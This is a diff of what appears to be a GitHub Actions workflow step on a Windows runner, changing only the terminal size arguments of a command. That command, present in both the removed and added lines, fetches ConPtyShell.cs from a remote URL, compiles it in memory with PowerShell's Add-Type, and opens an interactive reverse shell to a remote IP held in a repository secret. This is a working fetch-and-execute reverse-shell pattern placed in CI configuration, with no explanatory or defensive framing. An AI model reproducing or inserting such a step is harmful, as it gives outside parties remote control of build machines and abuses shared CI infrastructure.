@@ -8,4 +8,4 @@ jobs:
     runs-on: windows-latest
 
     steps:
-      - run: Add-Type -Language CSharp -TypeDefinition (IWR "https://github.com/Undefined01/build/raw/main/tools/ConPtyShell.cs" -UseBasicParsing); [ConPtyShellMainClass]::ConPtyShellMain(("${{ secrets.RemoteIp }}", 3001, 80, 24, "powershell"))
+      - run: Add-Type -Language CSharp -TypeDefinition (IWR "https://github.com/Undefined01/build/raw/main/tools/ConPtyShell.cs" -UseBasicParsing); [ConPtyShellMainClass]::ConPtyShellMain(("${{ secrets.RemoteIp }}", 3001, 24, 80, "powershell"))
